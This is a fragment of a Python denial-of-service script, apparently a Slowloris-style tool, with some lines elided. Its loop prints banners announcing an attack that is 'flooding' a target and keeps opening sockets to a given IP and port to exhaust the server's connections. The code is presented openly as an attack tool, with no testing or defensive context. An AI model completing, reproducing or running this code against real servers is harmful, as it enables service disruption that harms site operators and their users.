...
def main():
    ...
    while True:
        print(("\033[32m[÷]\033[31m▒▒\033[92m▒▒BUILD\033[33m▒▒ATTACK\033[31m▒▒\033[33mFLOODING▒▒TARGET▒▒{}".format(len(socket_list))))
        ...
        for _ in range(socket_count - len(socket_list)):
            print(("\033[33m {}▒▒▒▒\033[37m▒▒\033[33m▒▒▒CONNECT▒▒THE▒▒WEBS\033[31m▒▒\033[96m▒▒\033[35m▒▒".format("\n")))
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
